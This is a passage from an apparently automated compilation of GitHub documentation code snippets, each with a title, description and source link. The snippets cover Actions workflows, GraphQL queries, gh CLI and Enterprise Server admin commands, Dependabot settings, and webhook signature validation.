$env:GITHUB_STEP_SUMMARY\n```\n\n----------------------------------------\n\nTITLE: Migrate Jenkins Pipeline to GitHub Actions Workflow (Shell)\nDESCRIPTION: This command migrates a Jenkins pipeline to a GitHub Actions workflow. It converts the pipeline definition from a specified Jenkins job URL to an equivalent GitHub Actions workflow and creates a pull request in the target GitHub repository. The `--target-url` specifies the GitHub repository, `--output-dir` specifies the directory for temporary files, and `--source-url` specifies the Jenkins job URL.\nSOURCE: https://github.com/github/docs/blob/main/content/actions/migrating-to-github-actions/using-github-actions-importer-to-automate-migrations/migrating-from-jenkins-with-github-actions-importer.md#_snippet_7\n\nLANGUAGE: shell\nCODE:\n```\ngh actions-importer migrate jenkins --target-url https://github.com/:owner/:repo --output-dir tmp/migrate --source-url my-jenkins-project\n```\n\n----------------------------------------\n\nTITLE: Tailing Logs with ghe-logs-tail (Shell)\nDESCRIPTION: The `ghe-logs-tail` utility allows administrators to tail relevant log files from their GitHub Enterprise Server installation. Options can be passed to limit the logs to specific sets. Use the `-h` flag for additional options.\nSOURCE: https://github.com/github/docs/blob/main/content/admin/administering-your-instance/administering-your-instance-from-the-command-line/command-line-utilities.md#_snippet_11\n\nLANGUAGE: shell\nCODE:\n```\nghe-logs-tail\n```\n\n----------------------------------------\n\nTITLE: GraphQL Query to Find Issue ID\nDESCRIPTION: This GraphQL query retrieves the ID of a specific issue in the 'octocat/Hello-World' repository, identified by its number. The query targets the repository object, then the issue object, and finally requests the id field.\nSOURCE: https://github.com/github/docs/blob/main/content/graphql/guides/forming-calls-with-graphql.md#_snippet_4\n\nLANGUAGE: GraphQL\nCODE:\n```\nquery FindIssueID {\n  repository(owner:\"octocat\", name:\"Hello-World\") {\n    issue(number:349) {\n      id\n    }\n  }\n}\n```\n\n----------------------------------------\n\nTITLE: Disabling Job Container Requirement - YAML\nDESCRIPTION: This YAML snippet shows how to disable the requirement for jobs to have a container defined when using Kubernetes mode. By setting the `ACTIONS_RUNNER_REQUIRE_JOB_CONTAINER` environment variable to `false` in the runner container, jobs without a container definition can run. This requires modifying the `template.spec.containers` section.\nSOURCE: https://github.com/github/docs/blob/main/content/actions/hosting-your-own-runners/managing-self-hosted-runners-with-actions-runner-controller/deploying-runner-scale-sets-with-actions-runner-controller.md#_snippet_25\n\nLANGUAGE: yaml\nCODE:\n```\ntemplate:\n  spec:\n    containers:\n      - name: runner\n        image: ghcr.io/actions/actions-runner:latest\n        command: [\"/home/runner/run.sh\"]\n        env:\n          - name: ACTIONS_RUNNER_REQUIRE_JOB_CONTAINER\n            value: \"false\"\n```\n\n----------------------------------------\n\nTITLE: Importing Migration Data with ghe-migrator\nDESCRIPTION: This command starts the import process using the `ghe-migrator import` command. It requires the path to the migration archive (.tar.gz), the Migration GUID, a username, and a personal access token (PAT) for authentication.\nSOURCE: https://github.com/github/docs/blob/main/content/migrations/using-ghe-migrator/migrating-data-to-github-enterprise-server.md#_snippet_7\n\nLANGUAGE: shell\nCODE:\n```\n$ ghe-migrator import /home/admin/MIGRATION-GUID.tar.gz -g MIGRATION-GUID -u USERNAME -p TOKEN\n```\n\n----------------------------------------\n\nTITLE: Adding Reviewers to Pull Request using gh CLI\nDESCRIPTION: This snippet shows how to assign reviewers to a pull request using the `--reviewer` flag with the `gh pr create` command. Reviewers provide feedback and ensure code quality.\nSOURCE: https://github.com/github/docs/blob/main/content/pull-requests/collaborating-with-pull-requests/proposing-changes-to-your-work-with-pull-requests/creating-a-pull-request.md#_snippet_7\n\nLANGUAGE: shell\nCODE:\n```\ngh pr create --reviewer monalisa,hubot --reviewer myorg/team-name\n```\n\n----------------------------------------\n\nTITLE: Conditional GET Request with Last-Modified - cURL\nDESCRIPTION: This snippet shows how to make a conditional GET request using the `if-modified-since` header. It retrieves the resource only if it has been modified since the specified date.  The `--include` option ensures the response headers are included.\nSOURCE: https://github.com/github/docs/blob/main/content/rest/using-the-rest-api/best-practices-for-using-the-rest-api.md#_snippet_1\n\nLANGUAGE: shell\nCODE:\n```\ncurl {% data variables.product.rest_url %}/repos/github/docs --include --header 'if-modified-since: Wed, 25 Oct 2023 19:17:59 GMT'\n```\n\n----------------------------------------\n\nTITLE: Running the Docker container with SSH and hook execution\nDESCRIPTION: This command runs a Docker container in detached mode, exposing port 52311 for SSH access and mounting volumes from the `data` container. The container executes the `sshd` service, enabling SSH connections and triggering the pre-receive hook.\nSOURCE: https://github.com/github/docs/blob/main/content/admin/enforcing-policies/enforcing-policy-with-pre-receive-hooks/creating-a-pre-receive-hook-script.md#_snippet_10\n\nLANGUAGE: shell\nCODE:\n```\n$ docker run -d -p 52311:22 --volumes-from data pre-receive.dev\n```\n\n----------------------------------------\n\nTITLE: Enabling Bundler Vendoring with Dependabot\nDESCRIPTION: This YAML snippet configures Dependabot to maintain vendored dependencies for Bundler by setting `vendor` to `true`. This instructs Dependabot to also update dependencies stored in the _vendor/cache_ directory. The update schedule is set to weekly on Saturdays with a limit of 10 open pull requests.\nSOURCE: https://github.com/github/docs/blob/main/content/code-security/dependabot/dependabot-version-updates/controlling-dependencies-updated.md#_snippet_10\n\nLANGUAGE: yaml\nCODE:\n```\nversion: 2\nupdates:\n- package-ecosystem: bundler\n  directory: \"/\"\n  # Vendoring Bundler\n  vendor: true\n  schedule:\n    interval: weekly\n    day: saturday\n  open-pull-requests-limit: 10\n```\n\n----------------------------------------\n\nTITLE: Workflow path ignore example\nDESCRIPTION: This YAML snippet demonstrates how to configure a workflow to run only when changes occur outside the `docs` directory. It specifies that the workflow should trigger on `push` events, but ignore changes within the `docs` directory.\nSOURCE: https://github.com/github/docs/blob/main/data/reusables/actions/workflows/triggering-a-workflow-paths3.md#_snippet_0\n\nLANGUAGE: yaml\nCODE:\n```\non:\n  push:\n    paths-ignore:\n      - 'docs/**'\n```\n\n----------------------------------------\n\nTITLE: Mirroring a Git Repository to Remote\nDESCRIPTION: This command performs a mirror push to ensure all refs from the local repository are pushed to the remote. `REMOTE-NAME` specifies the remote repository to push to. Use with caution as it overwrites the remote repository to match the local one.\nSOURCE: https://github.com/github/docs/blob/main/content/get-started/using-git/troubleshooting-the-2-gb-push-limit.md#_snippet_2\n\nLANGUAGE: shell\nCODE:\n```\ngit push REMOTE-NAME --mirror\n```\n\n----------------------------------------\n\nTITLE: Azure Pipelines Syntax for CMD by Default (YAML)\nDESCRIPTION: This YAML snippet demonstrates how Azure Pipelines uses the Command shell (cmd.exe) as the default shell on Windows. The `script` step will automatically execute within a CMD environment without explicit shell specification.\nSOURCE: https://github.com/github/docs/blob/main/content/actions/migrating-to-github-actions/manually-migrating-to-github-actions/migrating-from-azure-pipelines-to-github-actions.md#_snippet_2\n\nLANGUAGE: yaml\nCODE:\n```\njobs:\n  - job: run_command\n    pool:\n      vmImage: 'windows-latest'\n    steps:\n      - script: echo \"This step runs in CMD on Windows by default\"\n```\n\n----------------------------------------\n\nTITLE: Adding Job Summary using PowerShell\nDESCRIPTION: This PowerShell script adds markdown content to the job summary by appending a string to the `$env:GITHUB_STEP_SUMMARY` file.\nSOURCE: https://github.com/github/docs/blob/main/content/actions/writing-workflows/choosing-what-your-workflow-does/workflow-commands-for-github-actions.md#_snippet_43\n\nLANGUAGE: powershell\nCODE:\n```\n\"{markdown content}\" >> $env:GITHUB_STEP_SUMMARY\n```\n\n----------------------------------------\n\nTITLE: Retrieving Specific Pull Request Details with REST\nDESCRIPTION: This REST API call retrieves the detailed representation of a specific pull request. It is necessary to determine if a pull request is mergeable in REST API. The response payload may still contain more data than is required.\nSOURCE: https://github.com/github/docs/blob/main/content/graphql/guides/migrating-from-rest-to-graphql.md#_snippet_3\n\nLANGUAGE: shell\nCODE:\n```\ncurl -v {% data variables.product.rest_url %}/repos/:owner/:repo/pulls/:number\n```\n\n----------------------------------------\n\nTITLE: Defining PinnedDiscussion type in GraphQL\nDESCRIPTION: Defines the `PinnedDiscussion` type, representing a discussion pinned to a repository's index page. It includes fields for creation/update timestamps, database ID, the associated discussion, gradient colors, background pattern, and the user who pinned it. The type implements `Node` and `RepositoryNode`.\nSOURCE: https://github.com/github/docs/blob/main/content/graphql/guides/using-the-graphql-api-for-discussions.md#_snippet_9\n\nLANGUAGE: GraphQL\nCODE:\n```\n\"\"\"\nA Pinned discussion is a discussion pinned to a repository's index page.\n\"\"\"\ntype PinnedDiscussion implements Node & RepositoryNode {\n  \"\"\"\n  Identifies the date and time when the object was created.\n  \"\"\"\n  createdAt: DateTime!\n\n  \"\"\"\n  Identifies the primary key from the database.\n  \"\"\"\n  databaseId: Int\n\n  \"\"\"\n  The discussion that was pinned.\n  \"\"\"\n  discussion: Discussion!\n\n  \"\"\"\n  Color stops of the chosen gradient\n  \"\"\"\n  gradientStopColors: [String!]!\n  id: ID!\n\n  \"\"\"\n  Background texture pattern\n  \"\"\"\n  pattern: PinnedDiscussionPattern!\n\n  \"\"\"\n  The actor that pinned this discussion.\n  \"\"\"\n  pinnedBy: Actor!\n\n  \"\"\"\n  Preconfigured background gradient option\n  \"\"\"\n  preconfiguredGradient: PinnedDiscussionGradient\n\n  \"\"\"\n  The repository associated with this node.\n  \"\"\"\n  repository: Repository!\n\n  \"\"\"\n  Identifies the date and time when the object was last updated.\n  \"\"\"\n  updatedAt: DateTime!\n}\n\n```\n\n----------------------------------------\n\nTITLE: Checking SSSE3 CPU Flag Support in Shell\nDESCRIPTION: This shell command checks if the SSSE3 CPU flag is enabled on the virtual CPUs available to your GitHub Enterprise Server instance. It greps for the 'flags' line in /proc/cpuinfo, looking for 'ssse3', and returns 0 if found, indicating that SSSE3 is enabled.\nSOURCE: https://github.com/github/docs/blob/main/content/admin/managing-code-security/managing-github-advanced-security-for-your-enterprise/configuring-secret-scanning-for-your-appliance.md#_snippet_0\n\nLANGUAGE: shell\nCODE:\n```\ngrep -iE '^flags.*ssse3' /proc/cpuinfo >/dev/null | echo $?\n```\n\n----------------------------------------\n\nTITLE: Google Cloud Storage Attribute Condition Example\nDESCRIPTION: This snippet shows an example of the attribute condition required when configuring Google Cloud Storage with OIDC. The `HOSTNAME` placeholder should be replaced with the public hostname for the GitHub Enterprise Server instance.  The hostname must not include the protocol.\nSOURCE: https://github.com/github/docs/blob/main/content/admin/managing-github-actions-for-your-enterprise/enabling-github-actions-for-github-enterprise-server/enabling-github-actions-with-google-cloud-storage.md#_snippet_1\n\nLANGUAGE: text\nCODE:\n```\ngoogle.subject == \"HOSTNAME\"\n```\n\nLANGUAGE: text\nCODE:\n```\ngoogle.subject == \"my-ghes-host.example.com\"\n```\n\n----------------------------------------\n\nTITLE: Dependencies in qlpack.yml (YAML)\nDESCRIPTION: This snippet presents example dependency declarations within a `qlpack.yml` file.  It demonstrates how to specify version ranges for dependencies, using semantic versioning constraints. `codeql/cpp-all` and `my-user/my-lib` use caret ranges, while `other-dependency/from-source` uses a wildcard.\nSOURCE: https://github.com/github/docs/blob/main/content/code-security/codeql-cli/using-the-advanced-functionality-of-the-codeql-cli/publishing-and-using-codeql-packs.md#_snippet_23\n\nLANGUAGE: YAML\nCODE:\n```\ndependencies:\n  codeql/cpp-all: ^0.1.2\n  my-user/my-lib: ^0.2.3\n  other-dependency/from-source: \"*\"\n```\n\n----------------------------------------\n\nTITLE: Initial BankAccount Integration Test in Python\nDESCRIPTION: This snippet demonstrates a basic integration test for the BankAccount class's deposit method. It uses the unittest module and the unittest.mock.Mock class to simulate the NotificationSystem. It verifies that a valid deposit updates the balance correctly and that the notification system's notify method is called once with the expected message.\nSOURCE: https://github.com/github/docs/blob/main/content/copilot/using-github-copilot/guides-on-using-github-copilot/writing-tests-with-github-copilot.md#_snippet_5\n\nLANGUAGE: python\nCODE:\n```\nimport unittest\nfrom unittest.mock import Mock\nfrom bank_account import BankAccount\n\nclass TestBankAccountIntegration(unittest.TestCase):\n    def setUp(self):\n        self.notification_system = Mock()\n\n    def test_deposit_with_notification(self):\n        account = BankAccount(initial_balance=100, notification_system=self.notification_system)\n        account.deposit(50)\n        self.assertEqual(account.get_balance(), 150)\n        self.notification_system.notify.assert_called_once_with(\"Deposited 50, new balance: 150\")\n        \nif __name__ == '__main__':\n    unittest.main()\n```\n\n----------------------------------------\n\nTITLE: Querying Repository Discussions with GraphQL\nDESCRIPTION: This GraphQL query retrieves discussions from a specified repository. It fetches the total count of discussions, page information (startCursor, endCursor, hasNextPage, hasPreviousPage), and details about each discussion (cursor, node.id, id). It uses pagination to retrieve the first 10 discussions.\nSOURCE: https://github.com/github/docs/blob/main/content/graphql/guides/using-the-graphql-api-for-discussions.md#_snippet_0\n\nLANGUAGE: GraphQL\nCODE:\n```\nquery {\n  repository(owner: \"github\", name: \"some-repo\") {\n    discussions(first: 10) {\n      # type: DiscussionConnection\n      totalCount # Int!\n\n      pageInfo {\n        # type: PageInfo (from the public schema)\n        startCursor\n        endCursor\n        hasNextPage\n        hasPreviousPage\n      }\n\n      edges {\n        # type: DiscussionEdge\n        cursor\n        node {\n          # type: Discussion\n          id\n        }\n      }\n\n      nodes {\n        # type: Discussion\n        id\n      }\n    }\n  }\n}\n```\n\n----------------------------------------\n\nTITLE: Defining a Matrix with Arrays of Objects in YAML\nDESCRIPTION: This snippet demonstrates how to define a matrix strategy using arrays of objects in a GitHub Actions workflow.  It specifies two operating systems (ubuntu-latest and macos-latest) and two Node.js configurations, each with a version and an optional environment variable. This configuration produces 4 jobs.  The workflow utilizes a 'strategy' section to define a matrix with the keys 'os' and 'node'.\nSOURCE: https://github.com/github/docs/blob/main/data/reusables/actions/jobs/multi-dimension-matrix.md#_snippet_1\n\nLANGUAGE: YAML\nCODE:\n```\nmatrix:\n  os:\n    - ubuntu-latest\n    - macos-latest\n  node:\n    - version: 14\n    - version: 20\n      env: NODE_OPTIONS=--openssl-legacy-provider\n```\n\n----------------------------------------\n\nTITLE: Logging into private container registry with Docker\nDESCRIPTION: This YAML snippet demonstrates how to log into a private container registry on AWS using a username and password stored as GitHub secrets within a GitHub Actions workflow. It includes steps to checkout the repository, log into the registry, and build a Docker image. The example shows how to handle secrets when the workflow is triggered by Dependabot versus other actors, using READONLY_AWS_ACCESS_KEY_ID and READONLY_AWS_ACCESS_KEY.\nSOURCE: https://github.com/github/docs/blob/main/content/code-security/dependabot/troubleshooting-dependabot/troubleshooting-dependabot-on-github-actions.md#_snippet_0\n\nLANGUAGE: YAML\nCODE:\n```\nname: CI\non:\n  pull_request:\n    branches: [ main ]\n\njobs:\n  build:\n    runs-on: ubuntu-latest\n    steps:\n      - name: Checkout repository\n        uses: {% data reusables.actions.action-checkout %}\n\n      - name: Login to private container registry for dependencies\n        uses: docker/login-action@3b4c5d6e7f8a9b0c1d2e3f4a5b6c7d8e9f0a1b2c\n        with:\n          registry: https://1234567890.dkr.ecr.us-east-1.amazonaws.com\n          username: {% raw %}${{ secrets.READONLY_AWS_ACCESS_KEY_ID }}{% endraw %}\n          password: {% raw %}${{ secrets.READONLY_AWS_ACCESS_KEY }}{% endraw %}\n\n      - name: Build the Docker image\n        run: docker build . --file Dockerfile --tag my-image-name:$(date +%s)\n```\n\n----------------------------------------\n\nTITLE: Setting Default Tool in YAML Frontmatter\nDESCRIPTION: This YAML snippet demonstrates the use of the `defaultTool` property to override the initial tool selection for a documentation page. It shows how to set the default tool to the GitHub CLI. This ensures the correct tool-specific content is displayed initially, overriding the default web UI unless a user has set a preference.\nSOURCE: https://github.com/github/docs/blob/main/content/contributing/writing-for-github-docs/using-yaml-frontmatter.md#_snippet_5\n\nLANGUAGE: yaml\nCODE:\n```\ndefaultTool: cli\n```\n\n----------------------------------------\n\nTITLE: Enabling Active Mode on Replicas\nDESCRIPTION: These commands enable active mode on the first and second replicas, allowing them to serve end-user requests. This ensures that the replica can take over from the primary in case of failure, minimizing downtime.\nSOURCE: https://github.com/github/docs/blob/main/content/admin/monitoring-and-managing-your-instance/configuring-high-availability/creating-a-high-availability-replica.md#_snippet_5\n\nLANGUAGE: Shell\nCODE:\n```\n(replica1)$ ghe-repl-node --active\n```\n\nLANGUAGE: Shell\nCODE:\n```\n(replica2)$ ghe-repl-node --active\n```\n\n----------------------------------------\n\nTITLE: Signature Validation in Ruby\nDESCRIPTION: This Ruby code snippet demonstrates how to validate a Github webhook signature. It fetches public keys from the Github API, identifies the correct key based on the `key_id`, and verifies the signature against the payload using the `ECDSA-NIST-P256V1-SHA256` algorithm via openssl. It requires the `GITHUB_PRODUCTION_TOKEN` environment variable to be set.\nSOURCE: https://github.com/github/docs/blob/main/content/code-security/secret-scanning/secret-scanning-partnership-program/secret-scanning-partner-program.md#_snippet_3\n\nLANGUAGE: ruby\nCODE:\n```\nrequire 'openssl'\nrequire 'net/http'\nrequire 'uri'\nrequire 'json'\nrequire 'base64'\n\npayload = <<-EOL\n[{\"source\":\"commit\",\"token\":\"some_token\",\"type\":\"some_type\",\"url\":\"https://example.com/base-repo-url/\"}]\nEOL\n\npayload = payload\n\nsignature = \"MEQCIQDaMKqrGnE27S0kgMrEK0eYBmyG0LeZismAEz/BgZyt7AIfXt9fErtRS4XaeSt/AO1RtBY66YcAdjxji410VQV4xg==\"\n\nkey_id = \"bcb53661c06b4728e59d897fb6165d5c9cda0fd9cdf9d09ead458168deb7518c\"\n\nurl = URI.parse('https://api.github.com/meta/public_keys/secret_scanning')\n\nraise \"Need to define GITHUB_PRODUCTION_TOKEN environment variable\" unless ENV['GITHUB_PRODUCTION_TOKEN']\nrequest = Net::HTTP::Get.new(url.path)\nrequest['Authorization'] = \"Bearer #{ENV['GITHUB_PRODUCTION_TOKEN']}\"\n\nhttp = Net::HTTP.new(url.host, url.port)\nhttp.use_ssl = (url.scheme == \"https\")\n\nresponse = http.request(request)\n\nparsed_response = JSON.parse(response.body)\n\ncurrent_key_object = parsed_response[\"public_keys\"].find { |key| key[\"key_identifier\"] == key_id }\n\ncurrent_key = current_key_object[\"key\"]\n\nopenssl_key = OpenSSL::PKey::EC.new(current_key)\n\nputs openssl_key.verify(OpenSSL::Digest::SHA256.new, Base64.decode64(signature), payload.chomp)\n\n```\n\n----------------------------------------\n\nTITLE: Using openssl to diagnose SSL certificate problems\nDESCRIPTION: This command is used to diagnose SSL certificate problems, such as self-signed certificates or missing certificate chains.  Replace `HOST` with your server's hostname and `PORT` with the port number (usually 443 for HTTPS). Look for `verify error` in the output to identify problems.\nSOURCE: https://github.com/github/docs/blob/main/content/webhooks/testing-and-troubleshooting-webhooks/troubleshooting-webhooks.md#_snippet_1\n\nLANGUAGE: bash\nCODE:\n```\nopenssl s_client -connect HOST:PORT\n```\n\n----------------------------------------\n\nTITLE: Referencing Secrets in Dependabot Configuration - YAML\nDESCRIPTION: This code snippet demonstrates how to reference an encrypted secret stored in the repository or organization settings within the `dependabot.yml` configuration file.  The `${{secrets.NAME}}` syntax allows Dependabot to access the secret's value during dependency updates. 'NAME' should be replaced with the actual name of the secret configured.\nSOURCE: https://github.com/github/docs/blob/main/content/code-security/dependabot/working-with-dependabot/configuring-access-to-private-registries-for-dependabot.md#_snippet_0\n\nLANGUAGE: yaml\nCODE:\n```\npassword: ${{secrets.MY_ARTIFACTORY_PASSWORD}}\n```\n\n----------------------------------------\n\nTITLE: Fetching User Information with API in Ruby\nDESCRIPTION: This code defines a function `user_info` to fetch user information from the GitHub API using the access token. It constructs a GET request to the `/user` endpoint, including the access token in the Authorization header.  The function then calls parse_response to handle the API response and uses `net/http` to make the request to GitHub's REST API\nSOURCE: https://github.com/github/docs/blob/main/content/apps/creating-github-apps/writing-code-for-a-github-app/building-a-login-with-github-button-with-a-github-app.md#_snippet_12\n\nLANGUAGE: ruby\nCODE:\n```\ndef user_info(token)\n  uri = URI(\"{% data variables.product.rest_url %}/user\")\n\n  result = Net::HTTP.start(uri.host, uri.port, use_ssl: true) do |http|\n    auth = \"Bearer #{token}\"\n    headers = {\"Accept\" => \"application/json\", \"Content-Type\" => \"application/json\", \"Authorization\" => auth}\n\n    http.send_request(\"GET\", uri.path, nil, headers)\n  end\n\n  parse_response(result)\nend\n```\n\n----------------------------------------\n\nTITLE: Getting help for GitHub CLI using gh --help\nDESCRIPTION: This command displays the available top-level commands for the GitHub CLI.  Adding `--help` to any command or subcommand will output more information about its usage.\nSOURCE: https://github.com/github/docs/blob/main/content/github-cli/github-cli/quickstart.md#_snippet_11\n\nLANGUAGE: Shell\nCODE:\n```\ngh\n```\n\nLANGUAGE: Shell\nCODE:\n```\ngh issue --help\n```\n\nLANGUAGE: Shell\nCODE:\n```\ngh issue create --help\n```\n\n----------------------------------------\n\nTITLE: Monitor Backup Progress Once (ghe-backup-progress --once)\nDESCRIPTION: This command monitors the progress of a backup operation and prints the current progress, the last completed job, and exits.\nSOURCE: https://github.com/github/docs/blob/main/content/admin/backing-up-and-restoring-your-instance/configuring-backups-on-your-instance.md#_snippet_8\n\nLANGUAGE: shell\nCODE:\n```\nbin/ghe-backup-progress --once\n```\n\n----------------------------------------\n\nTITLE: List Codespaces for an Organization using GitHub CLI\nDESCRIPTION: This command lists all current codespaces for a specified organization using the GitHub CLI. It requires the user to be an organization owner. Replace `ORGANIZATION` with the actual organization name. The output includes name, display name, user, repository, branch, and state of each codespace.\nSOURCE: https://github.com/github/docs/blob/main/content/codespaces/managing-codespaces-for-your-organization/listing-the-codespaces-in-your-organization.md#_snippet_0\n\nLANGUAGE: shell\nCODE:\n```\ngh codespace list --org ORGANIZATION\n```\n\n----------------------------------------\n\nTITLE: Creating a New Virtual Hard Disk in PowerShell\nDESCRIPTION: This PowerShell command creates a new virtual hard disk (VHD) for data storage. It sets the path and size of the disk. Replace PATH_TO_DATA_DISK with the desired location and DISK_SIZE with the required disk size in bytes.  This disk will be used to store GitHub Enterprise Server data.\nSOURCE: https://github.com/github/docs/blob/main/content/admin/installing-your-enterprise-server/setting-up-a-github-enterprise-server-instance/installing-github-enterprise-server-on-hyper-v.md#_snippet_1\n\nLANGUAGE: shell\nCODE:\n```\nPS C:\\> New-VHD -Path PATH_TO_DATA_DISK -SizeBytes DISK_SIZE\n```\n\n----------------------------------------\n\nTITLE: Forecasting GitHub Actions Usage\nDESCRIPTION: This code snippet demonstrates how to forecast potential GitHub Actions usage based on completed Travis CI pipeline runs. The `gh actions-importer forecast travis-ci` command generates a forecast report. The `--output-dir` flag determines the location for storing the report, which contains metrics like job count, pipeline count, and execution time.\nSOURCE: https://github.com/github/docs/blob/main/content/actions/migrating-to-github-actions/using-github-actions-importer-to-automate-migrations/migrating-from-travis-ci-with-github-actions-importer.md#_snippet_5\n\nLANGUAGE: shell\nCODE:\n```\ngh actions-importer forecast travis-ci --output-dir tmp/forecast\n```\n\n----------------------------------------\n\nTITLE: Returning Query Cost with GraphQL\nDESCRIPTION: This GraphQL query retrieves the point value of a query by querying the `cost` field on the `rateLimit` object. It also fetches the viewer's login. This is used to estimate how much a query will cost against the rate limit before executing the query.\nSOURCE: https://github.com/github/docs/blob/main/content/graphql/overview/rate-limits-and-node-limits-for-the-graphql-api.md#_snippet_1\n\nLANGUAGE: graphql\nCODE:\n```\nquery {\n  viewer {\n    login\n  }\n  rateLimit {\n    cost\n  }\n}\n```\n\n----------------------------------------\n\nTITLE: Start Repository Migration - GraphQL\nDESCRIPTION: This snippet shows the `startRepositoryMigration` GraphQL mutation used to initiate the repository migration process to GitHub Enterprise Cloud. It includes required input parameters such as sourceId, ownerId, repositoryName, archive URLs, and access tokens. The mutation returns details of the newly created repository migration.\nSOURCE: https://github.com/github/docs/blob/main/content/migrations/using-github-enterprise-importer/migrating-between-github-products/migrating-repositories-from-github-enterprise-server-to-github-enterprise-cloud.md#_snippet_7\n\nLANGUAGE: GraphQL\nCODE:\n```\nmutation startRepositoryMigration (\n  $sourceId: ID!,\n  $ownerId: ID!,\n  $repositoryName: String!,\n  $continueOnError: Boolean!,\n  $accessToken: String!,\n  $githubPat: String!,\n  $gitArchiveUrl: String!,\n  $metadataArchiveUrl: String!,\n  $sourceRepositoryUrl: URI!,\n  $targetRepoVisibility: String!\n){\n  startRepositoryMigration( input: {\n    sourceId: $sourceId,\n    ownerId: $ownerId,\n    repositoryName: $repositoryName,\n    continueOnError: $continueOnError,\n    accessToken: $accessToken,\n    githubPat: $githubPat,\n    targetRepoVisibility: $targetRepoVisibility\n    gitArchiveUrl: $gitArchiveUrl,\n    metadataArchiveUrl: $metadataArchiveUrl,\n    sourceRepositoryUrl: $sourceRepositoryUrl,\n  }) {\n    repositoryMigration {\n      id\n      migrationSource {\n        id\n        name\n        type\n      }\n      sourceUrl\n    }\n  }\n}\n```\n\n----------------------------------------\n\nTITLE: Running CodeQL queries against a database\nDESCRIPTION: This command runs a set of queries against a CodeQL database. The results are saved in the results subdirectory of the database directory. It utilizes options for controlling threads and memory allocation. The command takes the database path and query paths (or suite/pack) as arguments.\nSOURCE: https://github.com/github/docs/blob/main/content/code-security/codeql-cli/codeql-cli-manual/database-run-queries.md#_snippet_0\n\nLANGUAGE: shell\nCODE:\n```\ncodeql database run-queries [--threads=<num>] [--ram=<MB>] <options>... -- <database> <query|dir|suite|pack>...\n```\n\n----------------------------------------\n\nTITLE: Storing Copilot Metrics API Data to Local JSON File\nDESCRIPTION: This JavaScript snippet extends the previous example to store Copilot metrics data retrieved from the API into a local JSON file. It imports necessary file system modules, reads existing data from the file, appends new data (avoiding duplicates), and saves the updated data back to the file. The function saves new data that is returned each day, without overwriting old data in the file.\nSOURCE: https://github.com/github/docs/blob/main/content/copilot/rolling-out-github-copilot-at-scale/analyzing-usage-over-time-with-the-copilot-metrics-api.md#_snippet_1\n\nLANGUAGE: JavaScript\nCODE:\n```\n// Import Octokit\nimport { Octokit } from \"octokit\";\n\n// **Import modules for working with files**\nimport path from 'path';\nimport fs from 'fs';\nimport { fileURLToPath } from 'url';\nimport { dirname } from 'path';\n\n// **Declare variables for working with files**\nconst __filename = fileURLToPath(import.meta.url);\nconst __dirname = dirname(__filename);\n\n// Set your token and organization\nconst octokit = new Octokit({\n  auth: 'YOUR_TOKEN'\n});\n\nconst org = 'YOUR_ORG';\n\n// Call the API\nasync function orgMetrics() {\n  const resp = await octokit.request(`GET /orgs/${org}/copilot/metrics`, {\n    org: 'ORG',\n    headers: {\n      'X-GitHub-Api-Version': '2022-11-28'\n    }\n  });\n\n  const copilotUsage = resp.data;\n\n  // **Define the path to the local file where data will be stored**\n  const dataFilePath = path.join(__dirname, 'copilotMetricsData.json');\n\n  // **Read existing data from the file, if it exists**\n  let existingData = [];\n  if (fs.existsSync(dataFilePath)) {\n    const fileContent = fs.readFileSync(dataFilePath, 'utf8');\n    existingData = JSON.parse(fileContent);\n  }\n\n  // **Filter out the new data that is not already in the existing data**\n  const newData = copilotUsage.filter(entry => !existingData.some(existingEntry => existingEntry.date === entry.date));\n\n  // **Append new data to the existing data**\n  if (newData.length > 0) {\n    existingData = existingData.concat(newData);\n\n    // **Save the updated data back to the file**\n    fs.writeFileSync(dataFilePath, JSON.stringify(existingData, null, 2));\n    console.log(`Saved ${newData.length} new entries.`);\n  } else {\n    console.log('No new data to save.');\n  }\n}\n\n// Call the function\norgMetrics();\n```\n\n----------------------------------------\n\nTITLE: Add workflow step for Apple certificate and provisioning profile\nDESCRIPTION: This YAML snippet demonstrates a workflow step that installs the Apple certificate and provisioning profile on a {% data variables.product.prodname_actions %} runner. It retrieves the Base64 encoded certificate, password, and provisioning profile from secrets, decodes them, creates a temporary keychain, imports the certificate, and applies the provisioning profile. This requires secrets named `BUILD_CERTIFICATE_BASE64`, `P12_PASSWORD`, `BUILD_PROVISION_PROFILE_BASE64`, and `KEYCHAIN_PASSWORD`.\nSOURCE: https://github.com/github/docs/blob/main/content/actions/use-cases-and-examples/deploying/installing-an-apple-certificate-on-macos-runners-for-xcode-development.md#_snippet_2\n\nLANGUAGE: yaml\nCODE:\n```\nname: App build\non: push\n\njobs:\n  build_with_signing:\n    runs-on: macos-latest\n\n    steps:\n      - name: Checkout repository\n        uses: {% data reusables.actions.action-checkout %}\n      - name: Install the Apple certificate and provisioning profile\n        env:\n          BUILD_CERTIFICATE_BASE64: {% raw %}${{ secrets.BUILD_CERTIFICATE_BASE64 }}{% endraw %}\n          P12_PASSWORD: {% raw %}${{ secrets.P12_PASSWORD }}{% endraw %}\n          BUILD_PROVISION_PROFILE_BASE64: {% raw %}${{ secrets.BUILD_PROVISION_PROFILE_BASE64 }}{% endraw %}\n          KEYCHAIN_PASSWORD: {% raw %}${{ secrets.KEYCHAIN_PASSWORD }}{% endraw %}\n        run: |\n          # create variables\n          CERTIFICATE_PATH=$RUNNER_TEMP/build_certificate.p12\n          PP_PATH=$RUNNER_TEMP/build_pp.mobileprovision\n          KEYCHAIN_PATH=$RUNNER_TEMP/app-signing.keychain-db\n\n          # import certificate and provisioning profile from secrets\n          echo -n \"$BUILD_CERTIFICATE_BASE64\" | base64 --decode -o $CERTIFICATE_PATH\n          echo -n \"$BUILD_PROVISION_PROFILE_BASE64\" | base64 --decode -o $PP_PATH\n\n          # create temporary keychain\n          security create-keychain -p \"$KEYCHAIN_PASSWORD\" $KEYCHAIN_PATH\n          security set-keychain-settings -lut 21600 $KEYCHAIN_PATH\n          security unlock-keychain -p \"$KEYCHAIN_PASSWORD\" $KEYCHAIN_PATH\n\n          # import certificate to keychain\n          security import $CERTIFICATE_PATH -P \"$P12_PASSWORD\" -A -t cert -f pkcs12 -k $KEYCHAIN_PATH\n          security set-key-partition-list -S apple-tool:,apple: -k \"$KEYCHAIN_PASSWORD\" $KEYCHAIN_PATH\n          security list-keychain -d user -s $KEYCHAIN_PATH\n\n          # apply provisioning profile\n          mkdir -p ~/Library/MobileDevice/Provisioning\\ Profiles\n          cp $PP_PATH ~/Library/MobileDevice/Provisioning\\ Profiles\n      - name: Build app\n          # ...\n```\n\n----------------------------------------\n\nTITLE: Authenticating to GitHub CLI 